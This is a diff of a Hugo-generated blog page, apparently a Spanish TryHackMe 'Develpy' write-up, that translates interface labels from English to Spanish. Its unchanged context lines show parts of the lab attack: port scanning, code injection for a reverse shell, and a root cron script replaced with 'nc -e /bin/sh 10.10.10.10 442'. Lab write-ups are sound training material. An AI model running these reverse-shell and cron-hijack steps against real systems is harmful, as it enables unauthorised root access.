@@ -200,7 +200,7 @@ if (!doNotTrack) {
   <div id="the-top" class="absolute flex self-center">
     <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
       href="#main-content"><span
-        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Ir al contenido</a>
   </div>
   
   
@@ -698,7 +698,7 @@ if (!doNotTrack) {
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2022-12-31 00:00:00 &#43;0000 UTC">31/12/2022</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+  <time datetime="2022-12-31 00:00:00 &#43;0000 UTC">31/12/2022</time><span class="px-2 text-primary-500">&middot;</span><span title="Tiempo de lectura">4 mins</span>
   
 
   
@@ -820,7 +820,7 @@ if (!doNotTrack) {
         <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
   <summary
     class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
-    Table of Contents
+    Tabla de contenido
   </summary>
   <div
     class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
@@ -847,7 +847,7 @@ if (!doNotTrack) {
 <details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
   <summary
     class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
-    Table of Contents
+    Tabla de contenido
   </summary>
   <div
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
@@ -888,7 +888,7 @@ if (!doNotTrack) {
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#reconocimiento" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#reconocimiento" aria-label="Ancla">#</a></span>        
     
 </h2><p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ ping -c <span class="m">1</span> 10.10.139.165
@@ -904,7 +904,7 @@ rtt min/avg/max/mdev <span class="o">=</span> 50.434/50.434/50.434/0.000 ms
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#escaneo-de-puertos-nmap" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#escaneo-de-puertos-nmap" aria-label="Ancla">#</a></span>        
     
 </h3><p>Ahora empezamos con un escaneo de puertos</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap -p- --open -sS --min-rate <span class="m">5000</span> -n -vvv -Pn 10.10.139.165 -oG allPorts
@@ -1004,7 +1004,7 @@ PORT      STATE SERVICE           VERSION
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#puerto-10000" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#puerto-10000" aria-label="Ancla">#</a></span>        
     
 </h2><p>Cuando nos conectamos por nc al puerto 10000 sale este mensaje:</p>
 <pre tabindex="0"><code>❯ nc 10.10.139.165 10000
@@ -1027,7 +1027,7 @@ Exploit started, attacking target (tryhackme.com)...
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#intrusi%c3%b3n" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#intrusi%c3%b3n" aria-label="Ancla">#</a></span>        
     
 </h2><p>Como ya hemos visto que podemos inyectar código vamos a intentar mandarnos una reverse shell.</p>
 <p>Primero nos ponemos en escucha por el puerto <strong>443</strong> con <strong>netcat</strong> de la siguiente forma: <code>nc -nvlp 443</code>
@@ -1037,14 +1037,14 @@ Después en el <strong>exploit.py</strong> le vamos a poner <code>__import__('os
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#escalada-de-privilegios" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#escalada-de-privilegios" aria-label="Ancla">#</a></span>        
     
 </h2><div id="tratamiento-de-la-tty" class="anchor">Tratamiento de la tty></div>
 <h3 class="relative group">Tratamiento de la tty 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#tratamiento-de-la-tty" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#tratamiento-de-la-tty" aria-label="Ancla">#</a></span>        
     
 </h3><p>Antes de empezar lo primero para trabajar mejor es hacer un tratamiento de la tty&hellip;</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">script /dev/null -c bash
@@ -1059,7 +1059,7 @@ Después en el <strong>exploit.py</strong> le vamos a poner <code>__import__('os
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#usertxt" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#usertxt" aria-label="Ancla">#</a></span>        
     
 </h3><p>La falg user.txt está en /home/king/user.txt y la podemos ver con un <code>cat /home/king/user.txt</code></p>
 <div id="roottxt" class="anchor">root.txt></div>
@@ -1067,7 +1067,7 @@ Después en el <strong>exploit.py</strong> le vamos a poner <code>__import__('os
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#roottxt" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#roottxt" aria-label="Ancla">#</a></span>        
     
 </h3><p>Con un <code>cat /etc/crontab</code> podemos ver que el archivo <strong>root.sh</strong> lo está ejecutando continuamente el usuario root. No tenemos permisos de escritura en el root.sh, pero lo que podemos hacer es borrarlo, crear un archivo que se llame igual y dentro ponerle el siguiente código</p>
 <pre tabindex="0"><code>#!/bin/bash
@@ -1110,8 +1110,8 @@ nc -e /bin/sh 10.10.10.10 442
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
       href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://d3b0o.github.io/thm/develpy/&amp;title=Resoluci%c3%b3n%20Develpy"
-      title="Share on LinkedIn"
-      aria-label="Share on LinkedIn"
+      title="Compartir en LinkedIn"
+      aria-label="Compartir en LinkedIn"
       >
       
 
@@ -1129,8 +1129,8 @@ nc -e /bin/sh 10.10.10.10 442
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
       href="https://twitter.com/intent/tweet/?url=https://d3b0o.github.io/thm/develpy/&amp;text=Resoluci%c3%b3n%20Develpy"
-      title="Tweet on Twitter"
-      aria-label="Tweet on Twitter"
+      title="Tuitear en Twitter"
+      aria-label="Tuitear en Twitter"
       >
       
 
@@ -1148,8 +1148,8 @@ nc -e /bin/sh 10.10.10.10 442
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
       href="https://reddit.com/submit/?url=https://d3b0o.github.io/thm/develpy/&amp;resubmit=true&amp;title=Resoluci%c3%b3n%20Develpy"
-      title="Submit to Reddit"
-      aria-label="Submit to Reddit"
+      title="Publicar en Reddit"
+      aria-label="Publicar en Reddit"
       >
       
 
@@ -1169,8 +1169,8 @@ nc -e /bin/sh 10.10.10.10 442
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
       href="https://www.facebook.com/sharer/sharer.php?u=https://d3b0o.github.io/thm/develpy/&amp;quote=Resoluci%c3%b3n%20Develpy"
-      title="Share on Facebook"
-      aria-label="Share on Facebook"
+      title="Compartir en Facebook"
+      aria-label="Compartir en Facebook"
       >
       
 
@@ -1225,7 +1225,7 @@ nc -e /bin/sh 10.10.10.10 442
     <p class="text-xs text-neutral-500 dark:text-neutral-400">
       
       
-      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+      Desarrollada con <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
         href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
         href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
     </p>
@@ -1272,14 +1272,14 @@ nc -e /bin/sh 10.10.10.10 442
           type="search"
           id="search-query"
           class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
-          placeholder="Search"
+          placeholder="Buscar"
           tabindex="0"
         />
       </form>
       <button
         id="close-search-button"
         class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
-        title="Close (Esc)"
+        title="Cerrar (Esc)"
       >
         
 
